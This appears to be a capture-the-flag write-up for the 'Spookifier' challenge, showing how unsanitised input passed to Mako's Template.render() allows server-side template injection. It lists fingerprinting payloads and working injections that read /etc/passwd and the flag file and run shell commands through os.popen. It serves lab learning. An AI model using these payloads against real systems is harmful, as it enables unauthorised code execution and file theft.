# Spookifier

## in file **`util.py`**


<img width="1420" height="255" alt="image" src="https://github.com/user-attachments/assets/9ad7a976-1e1d-4b20-9046-c7e8004cc95b" />


> ### The `change_font()` function processes your input through multiple font transformations, and then the result is passed directly to Mako's Template.render() without proper sanitization.


---

## let's try to put SSTI payload

```python
${7*7}
```

<img width="1651" height="448" alt="image" src="https://github.com/user-attachments/assets/1db55c3d-d8e5-41fe-ba39-cb1d4c401b31" />

> ### it work let's identfiy which templet engine work 


<details>
   <summary>sheet cheat</summary>

🧠 SSTI Fingerprinting Cheat Sheet
----------------------------------

### 🔹 Python-based

-   `{{7*7}}` → **Jinja2 / Twig-like syntax**
-   `${open('/etc/passwd').read()}` → **Python eval / unsafe template execution** 🔥

* * * * *

### 🔹 Java-based (EL / Spring / JSP)

-   `${"test"}` → returns `test`
-   `${7*7}` → returns `49` (math evaluation)
-   `${7*'7'}` → returns `49` or error (no string repetition)

* * * * *

### 🔹 Python (Jinja2)

-   `{{7*7}}` → `49`
-   `{{7*'7'}}` → `7777777` 🔥 (string repetition)
-   `{{config}}` → may dump application config

* * * * *

### 🔹 PHP (Twig)

-   `{{7*7}}` → `49`
-   `{{7*'7'}}` → error (no repetition like Jinja2)

* * * * *

### 🔹 Java (Freemarker)

-   `${7*7}` → `49`
-   `${"test"?upper_case}` → `TEST`

* * * * *

### 🔹 Java (Velocity)

-   `#set($x=7*7) $x` → `49`

* * * * *

🔥 Case Analysis (This Challenge)
---------------------------------

The following payloads were tested:

-   `${7*7}` → worked ✔️
-   `${"test"}` → returned `test` ✔️
-   `${7*'7'}` → returned `7777777` ✔️
-   `${open('/flag.txt').read()}` → worked ✔️

### 💥 Conclusion

This confirms:

> **Python-based SSTI with direct code execution (unsafe eval-like behavior)**

The application allows direct access to Python built-in functions such as `open()`, leading to **arbitrary file read and full code execution**.


   
</details>





---

## list 

```
${__import__('os').popen('ls').read()}
```


<img width="868" height="134" alt="image" src="https://github.com/user-attachments/assets/e5369289-7ffd-46d7-a1c7-4f3b0e7cfd32" />


## see where are we

```
${__import__('os').popen('pwd').read()}
```

<img width="1304" height="430" alt="image" src="https://github.com/user-attachments/assets/f1cfe862-df30-43f5-969f-cefee925ebec" />



## read the flag:


```
${open('../flag.txt').read()}
```

<img width="1466" height="482" alt="image" src="https://github.com/user-attachments/assets/f37bcc22-f13b-496a-8d12-2dda2ad81ecd" />
















